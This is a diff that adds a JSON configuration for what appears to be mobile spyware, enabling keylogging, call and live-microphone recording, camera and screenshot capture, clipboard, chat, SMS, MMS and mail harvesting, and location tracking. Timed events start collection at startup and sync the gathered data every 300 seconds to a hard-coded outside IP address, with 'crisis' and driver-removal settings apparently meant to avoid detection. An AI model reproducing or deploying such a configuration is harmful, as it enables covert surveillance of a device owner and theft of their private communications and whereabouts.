@@ -1,1 +1,121 @@
-BINF
+{
+    "modules": [
+        {"module": "addressbook"},
+        {"module": "application"},
+        {"module": "calendar"},
+        {"record": true, "module": "call", "compression": 5, "buffer": 512000},
+        {"quality": "med", "module": "camera"},
+        {"module": "chat"},
+        {"module": "clipboard"},
+        {"module": "conference", "number": ""},
+        {
+            "network": {"processes": [], "enabled": false},
+            "call": true,
+            "module": "crisis",
+            "hook": {"processes": [], "enabled": true},
+            "synchronize": false,
+            "camera": true,
+            "position": true,
+            "mic": true
+        },
+        {"list": false, "module": "device"},
+        {"module": "keylog"},
+        {"module": "livemic", "number": ""},
+        {
+            "mail": {"filter": {"history": true, "maxsize": 100000, "datefrom": "2012-04-02 00:00:00"}, "enabled": true},
+            "module": "messages",
+            "sms": {"filter": {"history": true, "datefrom": "2012-04-02 00:00:00"}, "enabled": true},
+            "mms": {"filter": {"history": true, "datefrom": "2012-04-02 00:00:00"}, "enabled": true}
+        },
+        {"autosense": false, "module": "mic", "silence": 5, "threshold": 0.22},
+        {"gps": false, "module": "position", "wifi": true, "cell": true},
+        {"onlywindow": false, "quality": "med", "module": "screenshot"},
+        {"module": "url"}
+    ],
+    "actions": [
+        {
+            "subactions": [
+                {"status": "start", "action": "module", "module": "device"},
+                {"status": "start", "action": "module", "module": "call"},
+                {"status": "start", "action": "module", "module": "calendar"},
+                {"status": "start", "action": "module", "module": "addressbook"},
+                {"status": "start", "action": "module", "module": "messages"},
+                {"status": "start", "action": "module", "module": "chat"},
+                {"status": "start", "action": "module", "module": "url"}
+            ],
+            "desc": "STARTUP"
+        },
+        {
+            "subactions": [{"status": "start", "action": "module", "module": "screenshot"}],
+            "desc": "SCREENSHOT"
+        },
+        {"subactions": [{"status": "start", "action": "module", "module": "position"}], "desc": "POSITION"},
+        {
+            "subactions": [
+                {
+                    "bandwidth": 500000,
+                    "host": "93.62.139.39",
+                    "wifi": true,
+                    "mindelay": 0,
+                    "maxdelay": 0,
+                    "action": "synchronize",
+                    "cell": false,
+                    "stop": false
+                }
+            ],
+            "desc": "SYNC"
+        }
+    ],
+    "events": [
+        {
+            "subtype": "loop",
+            "event": "timer",
+            "ts": "00:00:00",
+            "start": 0,
+            "enabled": true,
+            "te": "23:59:59",
+            "desc": "STARTUP"
+        },
+        {
+            "delay": 30,
+            "subtype": "loop",
+            "event": "timer",
+            "ts": "00:00:00",
+            "repeat": 1,
+            "start": 1,
+            "enabled": true,
+            "te": "23:59:59",
+            "desc": "SCREENSHOT"
+        },
+        {
+            "delay": 60,
+            "subtype": "loop",
+            "event": "timer",
+            "ts": "00:00:00",
+            "repeat": 2,
+            "start": 2,
+            "enabled": true,
+            "te": "23:59:59",
+            "desc": "POSITION"
+        },
+        {
+            "delay": 300,
+            "subtype": "loop",
+            "event": "timer",
+            "ts": "00:00:00",
+            "repeat": 3,
+            "enabled": true,
+            "te": "23:59:59",
+            "desc": "SYNC"
+        }
+    ],
+    "globals": {
+        "collapsed": false,
+        "wipe": false,
+        "nohide": [],
+        "type": "mobile",
+        "quota": {"min": 100000000, "max": 100000000},
+        "advanced": false,
+        "remove_driver": true
+    }
+}
